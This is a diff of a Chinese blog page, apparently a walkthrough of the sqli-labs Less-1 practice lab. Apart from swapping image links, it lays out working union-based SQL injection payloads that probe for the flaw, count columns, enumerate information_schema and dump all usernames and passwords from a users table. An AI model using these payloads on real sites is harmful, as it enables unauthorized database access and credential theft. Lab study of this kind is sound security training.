@@ -185,7 +185,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-11-24 09:38:19 / 修改时间：09:38:50" itemprop="dateCreated datePublished" datetime="2020-11-24T09:38:19+08:00">2020-11-24</time>
+              <time title="创建时间：2020-11-24 09:38:19 / 修改时间：12:42:22" itemprop="dateCreated datePublished" datetime="2020-11-24T09:38:19+08:00">2020-11-24</time>
             </span>
 
           
@@ -200,19 +200,19 @@
 
       
           <h1 id="SQLI-LAB-1"><a href="#SQLI-LAB-1" class="headerlink" title="SQLI-LAB-1"></a>SQLI-LAB-1</h1><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>PHPstudy（不要新版）新版phpstudy的MySQL数据库和sqli-lab的数据库无法匹配<br>sqli-lab</p>
-<h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p><img src="./picture/sqli-1/1.png" alt="1"></p>
+<h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/FEF0A38D79D14C2E82065BEEF7E1971F/9" alt="1"></p>
 <h3 id="所需要用到的SQL语法"><a href="#所需要用到的SQL语法" class="headerlink" title="所需要用到的SQL语法"></a>所需要用到的SQL语法</h3><p>?id=0’<br>order by<br>union select</p>
 <h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>我们在拿到一个网站首先需要知道这个网站是否存在sql注入的漏洞，我们可以用?id=0’先试一下</p>
-<h4 id="id-0’"><a href="#id-0’" class="headerlink" title="?id=0’"></a>?id=0’</h4><p>使用 ?id=0’如果数字0出现在报错信息中则为字符型,如果0没有出现，则为数字型<br><img src="./picture/sqli-1/2.png" alt="2"><br>这里我们可以得到两个消息，第一个是该网站可以被sql注入第二个则是数据库使用的查询是字符型。</p>
-<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们使用order by语句可以来猜列数<br>例如order by 1,5–+<br>这里的–+相当于一个’号因为字符型引号必须对应闭合所以使用–+来让整个语句正确<br><img src="./picture/sqli-1/3.png" alt="3"><br>这里我们可以看见使用1，5太大了因为数据库中并没有5列<br>那么我们给它改小一点<br><img src="./picture/sqli-1/4.png" alt="4"><br>现在的显示就证明确实可能有1-3的行列当然我们也可以再试一下4但是这道题确实只有3列所以不进行尝试了，在正常的sql注入中还是需要准确知道有多少行列。</p>
+<h4 id="id-0’"><a href="#id-0’" class="headerlink" title="?id=0’"></a>?id=0’</h4><p>使用 ?id=0’如果数字0出现在报错信息中则为字符型,如果0没有出现，则为数字型<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/0C2C3268A3424B3BAAF490C0A8391C81/17" alt="2"><br>这里我们可以得到两个消息，第一个是该网站可以被sql注入第二个则是数据库使用的查询是字符型。</p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们使用order by语句可以来猜列数<br>例如order by 1,5–+<br>这里的–+相当于一个’号因为字符型引号必须对应闭合所以使用–+来让整个语句正确<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/1D0F029B4872405F8C0C8D30B479A0D4/20" alt="3"><br>这里我们可以看见使用1，5太大了因为数据库中并没有5列<br>那么我们给它改小一点<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/92ECDF9BFA9B4D16AED453AF17F0AA86/19" alt="4"><br>现在的显示就证明确实可能有1-3的行列当然我们也可以再试一下4但是这道题确实只有3列所以不进行尝试了，在正常的sql注入中还是需要准确知道有多少行列。</p>
 <h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>我们现在可以使用 union select联合查询的sql语法对数据库中的数据进行查询，来获取数据库中用户信息或者其他我们感兴趣的信息。<br>?id=0’ union select 1,(select group_concat(查询的列名) from 从哪个数据库查询.从哪个表里查询),3 –+<br>例如：<br>?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</p>
 <h4 id="为什么要使用-id-0’"><a href="#为什么要使用-id-0’" class="headerlink" title="为什么要使用?id=0’"></a>为什么要使用?id=0’</h4><p>因为我们需要使用一个不存在的id来让我们所需要的信息完整的呈现出来，也可以使用不在1到3之间的数值。</p>
-<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>这是MYSQL数据库里专门储备各种列表信息的一个数据库只要查询这里基本上可以获取数据库中各种列表的名字和信息。<br><img src="./picture/sqli-1/5.png" alt="5"></p>
-<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>我们可以看见有一个叫做security的列表security的中文是安全的意思所以我们可以推断一下里面可能有我们想要的账户信息<br>所以我们来尝试下进行sql注入来查询security内的所有表名<br>?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="./picture/sqli-1/6.png" alt="6"><br>这里我们是在第二行进行搜索所以我们想要的信息会呈现在第二行</p>
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>这是MYSQL数据库里专门储备各种列表信息的一个数据库只要查询这里基本上可以获取数据库中各种列表的名字和信息。<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/A9653B83521D4194A8089E894579013B/24" alt="5"></p>
+<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>我们可以看见有一个叫做security的列表security的中文是安全的意思所以我们可以推断一下里面可能有我们想要的账户信息<br>所以我们来尝试下进行sql注入来查询security内的所有表名<br>?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/8080CEE8E0B44F198067CD9CFA36AAF2/23" alt="6"><br>这里我们是在第二行进行搜索所以我们想要的信息会呈现在第二行</p>
 <h4 id="where-table-schema-’security’"><a href="#where-table-schema-’security’" class="headerlink" title="where table_schema=’security’"></a>where table_schema=’security’</h4><p>这里的sql语法是将security下的表名给我们呈现出来</p>
-<h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>我们可以看见有users是用户名的意思所以说里面会装着用户的密码和用户名<br>所以我们要用语句来获取所有users当中的列名<br>?id=0’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="./picture/sqli-1/7.png" alt="7"></p>
+<h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>我们可以看见有users是用户名的意思所以说里面会装着用户的密码和用户名<br>所以我们要用语句来获取所有users当中的列名<br>?id=0’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/5FFA9250CDDC496FA8CFC11849622E89/26" alt="7"></p>
 <h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>可以看见第一行呈现出的users库下有两个列名<br>username和password顾名思义就是用户名和密码<br>所以我们要使用如下语句查询所有的用户名，密码<br>select group_concat(password) from security.users</p>
-<p>select group_concat(username) from security.users<br>像这样插入<br>?id=0’ union select 1,(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="./picture/sqli-1/8.png" alt="8"><br>我们就得到了所有用户的密码和用户名</p>
+<p>select group_concat(username) from security.users<br>像这样插入<br>?id=0’ union select 1,(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="http://note.youdao.com/yws/public/resource/1c471452b569a01eac0465e52034174c/xmlnote/B0598708466544F59821CB11D9684253/28" alt="8"><br>我们就得到了所有用户的密码和用户名</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在使用sql注入时一定要先判断该网站是否存在这样的一个sql注入的漏洞，这样就已经成功一半了，进而通过查询mysql特有的库‘information_schema’来获取所有库名通过库名来查询自己想要的信息。</p>
 
       
